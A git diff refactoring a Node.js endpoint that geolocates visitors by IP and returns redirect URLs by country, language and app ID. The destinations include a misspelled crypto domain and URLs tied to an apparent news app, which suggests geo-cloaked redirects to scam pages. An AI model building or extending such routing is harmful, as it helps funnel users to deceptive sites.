@@ -18,26 +18,12 @@ module.exports.getUrl = async function (req, res) {
         }
 
         let data = checkCountry(ip, req.body.language, req.body.app);
-
-        let unique;
         const uniqueUser = await User.findOne({ip})
-        if (uniqueUser) {
-            unique = 0
-        } else {
-            unique = 1
-        }
 
         let date = getDate()
-
         let utmStatus = '';
 
-        let reason = null
             if (data.url === null) {
-                if (data.reason.length < 0) {
-                    reason = 'Invalid country'
-                } else {
-                    reason = data.reason
-                }
                 res.status(200).json({status: false})
             } else {
                 if (req.body.UTM) {
@@ -60,7 +46,7 @@ module.exports.getUrl = async function (req, res) {
             const user = new User({
                 UserAgent: req.body.UserAgent,
                 UTM: req.body.UTM,
-                reason: reason,
+                reason: data.reason.length < 0 ? 'Invalid country' : data.reason,
                 language: req.body.language.toUpperCase(),
                 url: data.url,
                 responseUrl: url,
@@ -68,7 +54,7 @@ module.exports.getUrl = async function (req, res) {
                 country: data.countryCode,
                 city: data.city,
                 bot: 0,
-                unique,
+                unique: uniqueUser ? 0 : 1,
                 date: date,
                 app: req.body.app || '',
                 utm_status: utmStatus
@@ -94,13 +80,11 @@ function checkCountry(ip, language, app) {
         countryCode = geo.country;
         city = geo.city;
 
-        if (countryCode === "CN" ||
-            countryCode === "SG" || countryCode === "AU" ||
+        if (countryCode === "CN" || countryCode === "SG" || countryCode === "AU" ||
             countryCode === "UK" || countryCode === "HK") {
             url = 'bitcoinunuion.info'
         } else if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
-            if (language.toUpperCase().includes('RU') ||
-                language.toUpperCase().includes('UA') ||
+            if (language.toUpperCase().includes('RU') || language.toUpperCase().includes('UA') ||
                 language.toUpperCase().includes('PL')) {
                 switch (app) {
                     case 'com.appside.polishnewsapp' :
@@ -119,7 +103,6 @@ function checkCountry(ip, language, app) {
                         url = 'magexemizer.pl'
                         break
                 }
-
             } else {
                 reason = 'Invalid language'
                 url = null
